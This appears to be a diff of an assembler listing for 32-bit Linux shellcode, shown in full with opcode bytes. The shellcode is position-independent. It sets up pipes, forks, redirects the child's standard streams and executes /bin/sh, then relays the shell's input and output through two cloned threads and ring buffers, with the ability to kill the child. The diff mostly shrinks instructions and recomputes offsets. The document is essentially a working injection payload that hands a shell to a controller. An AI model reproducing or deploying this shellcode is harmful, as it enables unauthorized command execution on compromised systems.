@@ -88,202 +88,202 @@
     88 00000000 E800000000              	call near shcode_start
     89                                  shcode_start:
     90 00000005 5D                      	pop	ebp
-    91 00000006 81C522020000            	add	ebp, data_start - shcode_start
+    91 00000006 81C509020000            	add	ebp, data_start - shcode_start
     92                                  
     93                                  	; pipe(m2sh)
     94 0000000C 31C0                    	xor	eax,eax
     95 0000000E B02A                    	mov	al,42
     96 00000010 89EB                    	mov	ebx,ebp
-    97 00000012 81C315000000            	add	ebx,m2sh_0
+    97 00000012 81C316000000            	add	ebx,m2sh_0
     98 00000018 CD80                    	int	0x80
     99                                  
-   100 0000001A 3D00000000              	cmp	eax,0
-   101 0000001F 7524                    	jne	child_dead_interleaved
+   100 0000001A 85C0                    	test	eax,eax
+   101 0000001C 751E                    	jnz	child_dead_interleaved
    102                                  
    103                                  	; pipe(sh2m)
-   104 00000021 31C0                    	xor	eax,eax
-   105 00000023 B02A                    	mov	al,42
-   106 00000025 89EB                    	mov	ebx,ebp
-   107 00000027 81C31D000000            	add	ebx,sh2m_0
-   108 0000002D CD80                    	int	0x80
+   104 0000001E 31C0                    	xor	eax,eax
+   105 00000020 B02A                    	mov	al,42
+   106 00000022 89EB                    	mov	ebx,ebp
+   107 00000024 81C31E000000            	add	ebx,sh2m_0
+   108 0000002A CD80                    	int	0x80
    109                                  
-   110 0000002F 3D00000000              	cmp	eax,0
-   111 00000034 750F                    	jne	child_dead_interleaved
+   110 0000002C 85C0                    	test	eax,eax
+   111 0000002E 750C                    	jnz	child_dead_interleaved
    112                                  
    113                                  	; fork()
-   114 00000036 31C0                    	xor	eax,eax
-   115 00000038 B002                    	mov	al,2
-   116 0000003A CD80                    	int	0x80
+   114 00000030 31C0                    	xor	eax,eax
+   115 00000032 B002                    	mov	al,2
+   116 00000034 CD80                    	int	0x80
    117                                  
-   118 0000003C 3D00000000              	cmp	eax,0
-   119 00000041 7407                    	je	child
-   120 00000043 7F5B                    	jg	parent			; signed compare
+   118 00000036 85C0                    	test	eax,eax
+   119 00000038 7407                    	jz	child
+   120 0000003A 7959                    	jns	parent			; signed > 0 ?
    121                                  child_dead_interleaved:
-   122 00000045 E9A5010000              	jmp	child_dead
+   122 0000003C E995010000              	jmp	child_dead
    123                                  
    124                                  child:
    125                                  	; dup2(m2sh[0], 0)   (dup to stdin)
-   126 0000004A 31C0                    	xor	eax,eax
-   127 0000004C B03F                    	mov	al,63
-   128 0000004E 8B9D15000000            	mov	ebx,[ebp+m2sh_0]
-   129 00000054 31C9                    	xor	ecx,ecx
-   130 00000056 CD80                    	int	0x80
+   126 00000041 31C0                    	xor	eax,eax
+   127 00000043 B03F                    	mov	al,63
+   128 00000045 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
+   129 0000004B 31C9                    	xor	ecx,ecx
+   130 0000004D CD80                    	int	0x80
    131                                  
-   132 00000058 39C8                    	cmp	eax,ecx
-   133 0000005A 753F                    	jne	leave_sh_interleaved
+   132 0000004F 39C8                    	cmp	eax,ecx
+   133 00000051 753D                    	jne	leave_sh_interleaved
    134                                  
    135                                  	; dup2(sh2m[1], 1)   (dup to stdout)
-   136 0000005C 31C0                    	xor	eax,eax
-   137 0000005E B03F                    	mov	al,63
-   138 00000060 8B9D21000000            	mov	ebx,[ebp+sh2m_1]
-   139 00000066 41                      	inc	ecx
-   140 00000067 CD80                    	int	0x80
-   141                                  
-   142 00000069 39C8                    	cmp	eax,ecx
-   143 0000006B 752E                    	jne	leave_sh_interleaved
-   144                                  
-   145                                  	; dup2(sh2m[1], 2)   (dup to stderr)
-   146 0000006D 31C0                    	xor	eax,eax
-   147 0000006F B03F                    	mov	al,63
-   148                                  ;	mov	ebx,[ebp+sh2m_1]
-   149 00000071 41                      	inc	ecx
-   150 00000072 CD80                    	int	0x80
-   151                                  
-   152 00000074 39C8                    	cmp	eax,ecx
-   153 00000076 7523                    	jne	leave_sh_interleaved
-   154                                  
-   155                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
-   156 00000078 31C0                    	xor	eax,eax
-   157 0000007A B00B                    	mov	al,11
-   158 0000007C 89EB                    	mov	ebx,ebp
-   159 0000007E 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
-   160                                  
-   161 00000084 89E9                    	mov	ecx,ebp
-   162 00000086 81C125020000            	add	ecx,foo				; ecx -> foo
-   163                                  
-   164 0000008C 31D2                    	xor	edx,edx
-   165 0000008E 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
-   166 00000090 895104                  	mov	[ecx+4],edx			; bar := NULL
-   167 00000093 89CA                    	mov	edx,ecx
-   168 00000095 42                      	inc	edx
-   169 00000096 42                      	inc	edx
-   170 00000097 42                      	inc	edx
-   171 00000098 42                      	inc	edx				; edx -> bar
-   172 00000099 CD80                    	int	0x80
-   173                                  
-   174                                  	; fail if execve did not work.
-   175                                  leave_sh_interleaved:
-   176 0000009B E980010000              	jmp	leave_sh
-   177                                  
-   178                                  parent:
-   179                                  	; remember child's PID
-   180 000000A0 898511000000            	mov	[ebp+child_pid],eax
-   181                                  
-   182                                  	; close(m2sh[0])
-   183 000000A6 31C0                    	xor	eax,eax
-   184 000000A8 B006                    	mov	al,6
-   185 000000AA 8B9D15000000            	mov	ebx,[ebp+m2sh_0]
-   186 000000B0 CD80                    	int	0x80
-   187                                  
-   188                                  	; close(sh2m[1])
-   189 000000B2 31C0                    	xor	eax,eax
-   190 000000B4 B006                    	mov	al,6
-   191 000000B6 8B9D21000000            	mov	ebx,[ebp+sh2m_1]
-   192 000000BC CD80                    	int	0x80
-   193                                  
-   194                                  	; clone:
-   195                                  	; one thread for reader, one thread for writer
-   196 000000BE 31C0                    	xor	eax,eax
-   197 000000C0 B078                    	mov	al,120
-   198                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
-   199                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
-   200                                  	; CLONE_PTRACE = 0x00002000
-   201 000000C2 BB000F0100              	mov	ebx,0x00010f00
-   202 000000C7 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
-   203 000000C9 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
-   204 000000CF 31D2                    	xor	edx,edx
-   205 000000D1 CD80                    	int	0x80
-   206                                  
-   207 000000D3 3D00000000              	cmp	eax,0
-   208                                  	; ret=0 -> clone
-   209 000000D8 7407                    	je	thread_write_to_master_interleaved	; clone is writer
-   210                                  	; ret>0 -> original
-   211 000000DA 7F0A                    	jg	thread_read_from_master			; original is reader
-   212                                  	; error if ret<0
-   213 000000DC E90E010000              	jmp	child_dead
-   214                                  
-   215                                  thread_write_to_master_interleaved:
-   216 000000E1 E98C000000              	jmp	thread_write_to_master
-   217                                  
-   218                                  	; ==================================== the READER thread:
-   219                                  thread_read_from_master:
-   220                                  	; will write to child via m2sh[1]
-   221                                  	; remember RINGBUFFER from_master in esi
-   222 000000E6 89EE                    	mov	esi,ebp
-   223 000000E8 81C625000000            	add	esi,rfrm_buffer
-   224                                  
-   225                                  reader_while_fds_ok:
-   226                                  	; while both FDs are ok:
-   227 000000EE 8A8503000000            	mov	al,[ebp+to_child_ok]
-   228 000000F4 028504000000            	add	al,[ebp+from_child_ok]
-   229 000000FA 3C02                    	cmp	al,2
-   230 000000FC 754D                    	jne	leave_sh_second_interleaved
-   231                                  
-   232                                  	; test, if master requested child to be terminated
-   233 000000FE 8A8502000000            	mov	al,[ebp+terminate_child]
-   234 00000104 3C00                    	cmp	al,0
-   235 00000106 754F                    	jne	do_terminate_child
-   236                                  
-   237                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
-   238 00000108 31C0                    	xor	eax,eax
-   239 0000010A 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
-   240 00000110 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
-   241 00000116 3C00                    	cmp	al,0
-   242 00000118 7436                    	je	reader_sleep
-   243                                  
-   244                                  	; EAX/AL is the number of bytes to be written to the child.
-   245                                  
-   246                                  	; write a single byte to the child.
-   247 0000011A 31C0                    	xor	eax,eax
-   248 0000011C B004                    	mov	al,4
-   249 0000011E 8B9D19000000            	mov	ebx,[ebp+m2sh_1]	; EBX := m2sh[1]
-   250 00000124 31C9                    	xor	ecx,ecx
-   251 00000126 8A8D06000000            	mov	cl,[ebp+rfrm_reader_pos]
-   252 0000012C 01F1                    	add	ecx,esi			; ECX := reader_pos + buffer_base
-   253 0000012E 31D2                    	xor	edx,edx
-   254 00000130 42                      	inc	edx			; EDX := 1
-   255 00000131 CD80                    	int	0x80
-   256                                  
-   257 00000133 31DB                    	xor	ebx,ebx
-   258 00000135 43                      	inc	ebx
-   259 00000136 39D8                    	cmp	eax,ebx
-   260 00000138 7409                    	je	reader_write_to_child_ok
+   136                                  	; for sure: EAX is 0.
+   137                                  	;xor	eax,eax
+   138 00000053 B03F                    	mov	al,63
+   139 00000055 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
+   140 0000005B 41                      	inc	ecx
+   141 0000005C CD80                    	int	0x80
+   142                                  
+   143 0000005E 39C8                    	cmp	eax,ecx
+   144 00000060 752E                    	jne	leave_sh_interleaved
+   145                                  
+   146                                  	; dup2(sh2m[1], 2)   (dup to stderr)
+   147 00000062 31C0                    	xor	eax,eax
+   148 00000064 B03F                    	mov	al,63
+   149                                  ;	mov	ebx,[ebp+sh2m_1]
+   150 00000066 41                      	inc	ecx
+   151 00000067 CD80                    	int	0x80
+   152                                  
+   153 00000069 39C8                    	cmp	eax,ecx
+   154 0000006B 7523                    	jne	leave_sh_interleaved
+   155                                  
+   156                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
+   157 0000006D 31C0                    	xor	eax,eax
+   158 0000006F B00B                    	mov	al,11
+   159 00000071 89EB                    	mov	ebx,ebp
+   160 00000073 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
+   161                                  
+   162 00000079 89E9                    	mov	ecx,ebp
+   163 0000007B 81C126020000            	add	ecx,foo				; ecx -> foo
+   164                                  
+   165 00000081 31D2                    	xor	edx,edx
+   166 00000083 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
+   167 00000085 895104                  	mov	[ecx+4],edx			; bar := NULL
+   168 00000088 89CA                    	mov	edx,ecx
+   169 0000008A 42                      	inc	edx
+   170 0000008B 42                      	inc	edx
+   171 0000008C 42                      	inc	edx
+   172 0000008D 42                      	inc	edx				; edx -> bar
+   173 0000008E CD80                    	int	0x80
+   174                                  
+   175                                  	; fail if execve did not work.
+   176                                  leave_sh_interleaved:
+   177 00000090 E972010000              	jmp	leave_sh
+   178                                  
+   179                                  parent:
+   180                                  	; remember child's PID
+   181 00000095 898512000000            	mov	[ebp+child_pid],eax
+   182                                  
+   183                                  	; close(m2sh[0])
+   184 0000009B 31C0                    	xor	eax,eax
+   185 0000009D B006                    	mov	al,6
+   186 0000009F 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
+   187 000000A5 CD80                    	int	0x80
+   188                                  
+   189                                  	; close(sh2m[1])
+   190 000000A7 31C0                    	xor	eax,eax
+   191 000000A9 B006                    	mov	al,6
+   192 000000AB 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
+   193 000000B1 CD80                    	int	0x80
+   194                                  
+   195                                  	; clone:
+   196                                  	; one thread for reader, one thread for writer
+   197 000000B3 31C0                    	xor	eax,eax
+   198 000000B5 B078                    	mov	al,120
+   199                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
+   200                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
+   201                                  	; CLONE_PTRACE = 0x00002000
+   202 000000B7 BB000F0100              	mov	ebx,0x00010f00
+   203 000000BC 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
+   204 000000BE 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
+   205 000000C4 31D2                    	xor	edx,edx
+   206 000000C6 CD80                    	int	0x80
+   207                                  
+   208 000000C8 85C0                    	test	eax,eax
+   209                                  	; ret=0 -> clone
+   210 000000CA 7407                    	jz	thread_write_to_master_interleaved	; clone is writer
+   211                                  	; ret>0 (signed) -> original
+   212 000000CC 790A                    	jns	thread_read_from_master			; original is reader
+   213                                  	; error if ret<0
+   214 000000CE E903010000              	jmp	child_dead
+   215                                  
+   216                                  thread_write_to_master_interleaved:
+   217 000000D3 E985000000              	jmp	thread_write_to_master
+   218                                  
+   219                                  	; ==================================== the READER thread:
+   220                                  thread_read_from_master:
+   221                                  	; will write to child via m2sh[1]
+   222                                  	; remember RINGBUFFER from_master in esi
+   223 000000D8 89EE                    	mov	esi,ebp
+   224 000000DA 81C626000000            	add	esi,rfrm_buffer
+   225                                  
+   226                                  reader_while_fds_ok:
+   227                                  	; while both FDs are ok:
+   228 000000E0 8A8503000000            	mov	al,[ebp+to_child_ok]
+   229 000000E6 028504000000            	add	al,[ebp+from_child_ok]
+   230 000000EC 3C02                    	cmp	al,2
+   231 000000EE 7549                    	jne	leave_sh_second_interleaved
+   232                                  
+   233                                  	; test, if master requested child to be terminated
+   234 000000F0 8A8502000000            	mov	al,[ebp+terminate_child]
+   235 000000F6 84C0                    	test	al,al
+   236 000000F8 754B                    	jnz	do_terminate_child
+   237                                  
+   238                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
+   239 000000FA 31C0                    	xor	eax,eax
+   240 000000FC 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
+   241 00000102 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
+   242 00000108 84C0                    	test	al,al
+   243 0000010A 7432                    	jz	reader_sleep
+   244                                  
+   245                                  	; EAX/AL is the number of bytes to be written to the child.
+   246                                  
+   247                                  	; write a single byte to the child.
+   248 0000010C 31C0                    	xor	eax,eax
+   249 0000010E B004                    	mov	al,4
+   250 00000110 8B9D1A000000            	mov	ebx,[ebp+m2sh_1]	; EBX := m2sh[1]
+   251 00000116 31C9                    	xor	ecx,ecx
+   252 00000118 8A8D06000000            	mov	cl,[ebp+rfrm_reader_pos]
+   253 0000011E 01F1                    	add	ecx,esi			; ECX := reader_pos + buffer_base
+   254 00000120 31D2                    	xor	edx,edx
+   255 00000122 42                      	inc	edx			; EDX := 1
+   256 00000123 CD80                    	int	0x80
+   257                                  
+   258                                  	; we wrote 1 byte, thus syscall should return 1 in EAX.
+   259 00000125 48                      	dec	eax
+   260 00000126 7409                    	jz	reader_write_to_child_ok
    261                                  
-   262 0000013A C6850300000000          	mov byte [ebp+to_child_ok], 0
-   263 00000141 EBAB                    	jmp	reader_while_fds_ok
+   262 00000128 C6850300000000          	mov byte [ebp+to_child_ok], 0
+   263 0000012F EBAF                    	jmp	reader_while_fds_ok
    264                                  
    265                                  reader_write_to_child_ok:
    266                                  	; mark byte as read:
-   267 00000143 FE8506000000            	inc byte [ebp+rfrm_reader_pos]
-   268 00000149 EBA3                    	jmp	reader_while_fds_ok
+   267 00000131 FE8506000000            	inc byte [ebp+rfrm_reader_pos]
+   268 00000137 EBA7                    	jmp	reader_while_fds_ok
    269                                  
    270                                  leave_sh_second_interleaved:
-   271 0000014B E9D0000000              	jmp	leave_sh
+   271 00000139 E9C9000000              	jmp	leave_sh
    272                                  
    273                                  reader_sleep:
-   274 00000150 E87D000000              	call	sleep_short
-   275 00000155 EB97                    	jmp	reader_while_fds_ok
+   274 0000013E E876000000              	call	sleep_short
+   275 00000143 EB9B                    	jmp	reader_while_fds_ok
    276                                  
    277                                  do_terminate_child:
    278                                  	; reset flag
-   279 00000157 31C0                    	xor	eax,eax
-   280 00000159 888502000000            	mov	[ebp+terminate_child],al
+   279 00000145 31C0                    	xor	eax,eax
+   280 00000147 888502000000            	mov	[ebp+terminate_child],al
    281                                  	; send a SIGKILL to child
-   282 0000015F B025                    	mov	al,37
-   283 00000161 8B9D11000000            	mov	ebx,[ebp+child_pid]
-   284 00000167 31C9                    	xor	ecx,ecx
-   285 00000169 B109                    	mov	cl,9	; SIGKILL
-   286 0000016B CD80                    	int	0x80
+   282 0000014D B025                    	mov	al,37
+   283 0000014F 8B9D12000000            	mov	ebx,[ebp+child_pid]
+   284 00000155 31C9                    	xor	ecx,ecx
+   285 00000157 B109                    	mov	cl,9	; SIGKILL
+   286 00000159 CD80                    	int	0x80
    287                                  
    288                                  ;	; clear to_child_ok
    289                                  ;	xor	eax,eax
@@ -293,162 +293,161 @@
    293                                  ;	jmp	leave_sh
    294                                  
    295                                  	; don't terminate, wait for child to close pipes. maybe it just relays the signal to other child.
-   296 0000016D E97CFFFFFF              	jmp	reader_while_fds_ok
+   296 0000015B EB83                    	jmp	reader_while_fds_ok
    297                                  
    298                                  	; ==================================== the WRITER thread:
    299                                  thread_write_to_master:
    300                                  	; will read from child via sh2m[0]
    301                                  	; remember RINGBUFFER to_master in esi
-   302 00000172 89EE                    	mov	esi,ebp
-   303 00000174 81C625010000            	add	esi,rto_buffer
+   302 0000015D 89EE                    	mov	esi,ebp
+   303 0000015F 81C626010000            	add	esi,rto_buffer
    304                                  
    305                                  writer_while_fds_ok:
    306                                  	; while both FDs are ok:
-   307 0000017A 8A8503000000            	mov	al,[ebp+to_child_ok]
-   308 00000180 028504000000            	add	al,[ebp+from_child_ok]
-   309 00000186 3C02                    	cmp	al,2
-   310 00000188 7565                    	jne	child_dead
+   307 00000165 8A8503000000            	mov	al,[ebp+to_child_ok]
+   308 0000016B 028504000000            	add	al,[ebp+from_child_ok]
+   309 00000171 3C02                    	cmp	al,2
+   310 00000173 7561                    	jne	child_dead
    311                                  
    312                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
-   313 0000018A 8A8507000000            	mov	al,[ebp+rto_writer_pos]
-   314 00000190 FEC0                    	inc	al
-   315 00000192 2A8508000000            	sub	al,[ebp+rto_reader_pos]
-   316 00000198 7431                    	jz	writer_sleep
+   313 00000175 8A8507000000            	mov	al,[ebp+rto_writer_pos]
+   314 0000017B FEC0                    	inc	al
+   315 0000017D 2A8508000000            	sub	al,[ebp+rto_reader_pos]
+   316 00000183 742D                    	jz	writer_sleep
    317                                  
    318                                  	; read ONE SINGLE BYTE and pass it into the buffer.
-   319 0000019A 31C0                    	xor	eax,eax
-   320 0000019C B003                    	mov	al,3
-   321 0000019E 8B9D1D000000            	mov	ebx,[ebp+sh2m_0]
-   322 000001A4 31C9                    	xor	ecx,ecx
-   323 000001A6 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
-   324 000001AC 01F1                    	add	ecx,esi
-   325 000001AE 31D2                    	xor	edx,edx
-   326 000001B0 42                      	inc	edx
-   327 000001B1 CD80                    	int	0x80
+   319 00000185 31C0                    	xor	eax,eax
+   320 00000187 B003                    	mov	al,3
+   321 00000189 8B9D1E000000            	mov	ebx,[ebp+sh2m_0]
+   322 0000018F 31C9                    	xor	ecx,ecx
+   323 00000191 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
+   324 00000197 01F1                    	add	ecx,esi
+   325 00000199 31D2                    	xor	edx,edx
+   326 0000019B 42                      	inc	edx
+   327 0000019C CD80                    	int	0x80
    328                                  
-   329 000001B3 31DB                    	xor	ebx,ebx
-   330 000001B5 43                      	inc	ebx
-   331 000001B6 39D8                    	cmp	eax,ebx
-   332 000001B8 7409                    	je	writer_read_from_child_ok
-   333                                  
-   334 000001BA C6850400000000          	mov byte [ebp+from_child_ok],0
-   335 000001C1 EBB7                    	jmp	writer_while_fds_ok
-   336                                  
-   337                                  writer_read_from_child_ok:
-   338 000001C3 FE8507000000            	inc byte [ebp+rto_writer_pos]
-   339                                  
-   340                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
-   341                                  	; read() will block if there is no data from child.
-   342 000001C9 EBAF                    	jmp	writer_while_fds_ok
-   343                                  
-   344                                  writer_sleep:
-   345 000001CB E802000000              	call	sleep_short
-   346 000001D0 EBA8                    	jmp	writer_while_fds_ok
-   347                                  
-   348                                  	; ==================================================================
-   349                                  
-   350                                  sleep_short:
-   351                                  	; sleep 0.001 seconds:
-   352                                  	; usleep(0,1000000);
-   353 000001D2 31C0                    	xor	eax,eax
-   354 000001D4 B0A2                    	mov	al, 162
-   355 000001D6 89EB                    	mov	ebx, ebp
-   356 000001D8 81C325020000            	add	ebx, foo
-   357 000001DE 89D9                    	mov	ecx, ebx
-   358 000001E0 31D2                    	xor	edx,edx
-   359 000001E2 8913                    	mov long [ebx], edx		; seconds
-   360 000001E4 BAA0860100              	mov	edx,100000
-   361 000001E9 895304                  	mov long [ebx+4], edx		; nanoseconds
-   362 000001EC CD80                    	int	0x80
-   363                                  
-   364 000001EE C3                      	ret
-   365                                  
-   366                                  child_dead:
-   367                                  	; at most wait 2 seconds for master's ACK
-   368 000001EF 31C0                    	xor	eax,eax
-   369 000001F1 388501000000            	cmp	[ebp+child_is_dead_ACK], al
-   370 000001F7 7527                    	jne	leave_sh
-   371 000001F9 B002                    	mov	al,2
-   372 000001FB 388500000000            	cmp	[ebp+child_is_dead], al
-   373 00000201 771D                    	ja	leave_sh
-   374                                  
-   375 00000203 FE4500                  	inc byte [ebp]
-   376                                  
-   377                                  	; usleep(1,0):
-   378 00000206 31C0                    	xor	eax,eax
-   379 00000208 B0A2                    	mov	al, 162
-   380 0000020A 89EB                    	mov	ebx, ebp
-   381 0000020C 81C325020000            	add	ebx, foo
-   382 00000212 89D9                    	mov	ecx, ebx
-   383 00000214 31D2                    	xor	edx,edx
-   384 00000216 895304                  	mov long [ebx+4], edx		; nanoseconds
-   385 00000219 42                      	inc	edx
-   386 0000021A 8913                    	mov long [ebx], edx		; seconds
-   387 0000021C CD80                    	int	0x80
-   388                                  
-   389 0000021E EBCF                    	jmp	child_dead
-   390                                  
-   391                                  leave_sh:
-   392                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
-   393 00000220 31C0                    	xor	eax,eax
-   394 00000222 89C3                    	mov	ebx,eax
-   395 00000224 40                      	inc	eax
-   396 00000225 CD80                    	int	0x80
-   397                                  
-   398                                  ; =============================================================================
-   399                                  ; DATA
-   400                                  data_start EQU $
-   401                                  
-   402                                  ; do not change order of the following stuff!
-   403                                  
-   404                                  child_is_dead EQU $ - data_start
-   405 00000227 00                      	db		0
-   406                                  child_is_dead_ACK EQU $ - data_start
-   407 00000228 00                      	db		0
-   408                                  
-   409                                  terminate_child	EQU $ - data_start
-   410 00000229 00                      	db		0
-   411                                  
-   412                                  to_child_ok EQU $ - data_start
-   413 0000022A 01                      	db		1
-   414                                  from_child_ok EQU $ - data_start
-   415 0000022B 01                      	db		1
-   416                                  
-   417                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
-   418                                  ; a ringbuffer is FULL, if _reader == _writer+1
-   419                                  
-   420                                  ; ringbuffer from_master:
-   421                                  
-   422                                  rfrm_writer_pos EQU $ - data_start
-   423 0000022C 00                      	db		0
-   424                                  rfrm_reader_pos EQU $ - data_start
-   425 0000022D 00                      	db		0
-   426                                  
-   427                                  ; ringbuffer to_master:
-   428                                  
-   429                                  rto_writer_pos EQU $ - data_start
-   430 0000022E 00                      	db		0
-   431                                  rto_reader_pos EQU $ - data_start
-   432 0000022F 00                      	db		0
-   433                                  
-   434                                  execve_command EQU $ - data_start
-   435 00000230 2F62696E2F736800        	db	'/bin/sh',0
-   436                                  
-   437                                  ; =============================================================================
-   438                                  ; stuff that is not required to be initialized:
-   439                                  align 4
-   440                                  
-   441                                  child_pid EQU $ - data_start
-   442                                  
-   443                                  ; pipes middleman<->shell
-   444                                  m2sh_0 EQU $ - data_start + 4			; shell reads
-   445                                  m2sh_1 EQU $ - data_start + 8			; master writes
-   446                                  sh2m_0 EQU $ - data_start + 12			; master reads
-   447                                  sh2m_1 EQU $ - data_start + 16			; shell writes
-   448                                  
-   449                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
-   450                                  rto_buffer EQU $ - data_start + 276		; TO master
-   451                                  
-   452                                  foo EQU $ - data_start + 532
-   453                                  bar EQU $ - data_start + 536
-   454                                  
+   329                                  	; we read one byte. syscall should return 1 in EAX.
+   330 0000019E 48                      	dec	eax
+   331 0000019F 7409                    	jz	writer_read_from_child_ok
+   332                                  
+   333 000001A1 C6850400000000          	mov byte [ebp+from_child_ok],0
+   334 000001A8 EBBB                    	jmp	writer_while_fds_ok
+   335                                  
+   336                                  writer_read_from_child_ok:
+   337 000001AA FE8507000000            	inc byte [ebp+rto_writer_pos]
+   338                                  
+   339                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
+   340                                  	; read() will block if there is no data from child.
+   341 000001B0 EBB3                    	jmp	writer_while_fds_ok
+   342                                  
+   343                                  writer_sleep:
+   344 000001B2 E802000000              	call	sleep_short
+   345 000001B7 EBAC                    	jmp	writer_while_fds_ok
+   346                                  
+   347                                  	; ==================================================================
+   348                                  
+   349                                  sleep_short:
+   350                                  	; sleep 0.001 seconds:
+   351                                  	; usleep(0,1000000);
+   352 000001B9 31C0                    	xor	eax,eax
+   353 000001BB B0A2                    	mov	al, 162
+   354 000001BD 89EB                    	mov	ebx, ebp
+   355 000001BF 81C326020000            	add	ebx, foo
+   356 000001C5 89D9                    	mov	ecx, ebx
+   357 000001C7 31D2                    	xor	edx,edx
+   358 000001C9 8913                    	mov long [ebx], edx		; seconds
+   359 000001CB BAA0860100              	mov	edx,100000
+   360 000001D0 895304                  	mov long [ebx+4], edx		; nanoseconds
+   361 000001D3 CD80                    	int	0x80
+   362                                  
+   363 000001D5 C3                      	ret
+   364                                  
+   365                                  child_dead:
+   366                                  	; at most wait 2 seconds for master's ACK
+   367 000001D6 31C0                    	xor	eax,eax
+   368 000001D8 388501000000            	cmp	[ebp+child_is_dead_ACK], al
+   369 000001DE 7527                    	jne	leave_sh
+   370 000001E0 B002                    	mov	al,2
+   371 000001E2 388500000000            	cmp	[ebp+child_is_dead], al
+   372 000001E8 771D                    	ja	leave_sh
+   373                                  
+   374 000001EA FE4500                  	inc byte [ebp]
+   375                                  
+   376                                  	; usleep(1,0):
+   377 000001ED 31C0                    	xor	eax,eax
+   378 000001EF B0A2                    	mov	al, 162
+   379 000001F1 89EB                    	mov	ebx, ebp
+   380 000001F3 81C326020000            	add	ebx, foo
+   381 000001F9 89D9                    	mov	ecx, ebx
+   382 000001FB 31D2                    	xor	edx,edx
+   383 000001FD 895304                  	mov long [ebx+4], edx		; nanoseconds
+   384 00000200 42                      	inc	edx
+   385 00000201 8913                    	mov long [ebx], edx		; seconds
+   386 00000203 CD80                    	int	0x80
+   387                                  
+   388 00000205 EBCF                    	jmp	child_dead
+   389                                  
+   390                                  leave_sh:
+   391                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
+   392 00000207 31C0                    	xor	eax,eax
+   393 00000209 89C3                    	mov	ebx,eax
+   394 0000020B 40                      	inc	eax
+   395 0000020C CD80                    	int	0x80
+   396                                  
+   397                                  ; =============================================================================
+   398                                  ; DATA
+   399                                  data_start EQU $
+   400                                  
+   401                                  ; do not change order of the following stuff!
+   402                                  
+   403                                  child_is_dead EQU $ - data_start
+   404 0000020E 00                      	db		0
+   405                                  child_is_dead_ACK EQU $ - data_start
+   406 0000020F 00                      	db		0
+   407                                  
+   408                                  terminate_child	EQU $ - data_start
+   409 00000210 00                      	db		0
+   410                                  
+   411                                  to_child_ok EQU $ - data_start
+   412 00000211 01                      	db		1
+   413                                  from_child_ok EQU $ - data_start
+   414 00000212 01                      	db		1
+   415                                  
+   416                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
+   417                                  ; a ringbuffer is FULL, if _reader == _writer+1
+   418                                  
+   419                                  ; ringbuffer from_master:
+   420                                  
+   421                                  rfrm_writer_pos EQU $ - data_start
+   422 00000213 00                      	db		0
+   423                                  rfrm_reader_pos EQU $ - data_start
+   424 00000214 00                      	db		0
+   425                                  
+   426                                  ; ringbuffer to_master:
+   427                                  
+   428                                  rto_writer_pos EQU $ - data_start
+   429 00000215 00                      	db		0
+   430                                  rto_reader_pos EQU $ - data_start
+   431 00000216 00                      	db		0
+   432                                  
+   433                                  execve_command EQU $ - data_start
+   434 00000217 2F62696E2F736800        	db	'/bin/sh',0
+   435                                  
+   436                                  ; =============================================================================
+   437                                  ; stuff that is not required to be initialized:
+   438 0000021F 90                      align 4
+   439                                  
+   440                                  child_pid EQU $ - data_start
+   441                                  
+   442                                  ; pipes middleman<->shell
+   443                                  m2sh_0 EQU $ - data_start + 4			; shell reads
+   444                                  m2sh_1 EQU $ - data_start + 8			; master writes
+   445                                  sh2m_0 EQU $ - data_start + 12			; master reads
+   446                                  sh2m_1 EQU $ - data_start + 16			; shell writes
+   447                                  
+   448                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
+   449                                  rto_buffer EQU $ - data_start + 276		; TO master
+   450                                  
+   451                                  foo EQU $ - data_start + 532
+   452                                  bar EQU $ - data_start + 536
+   453                                  
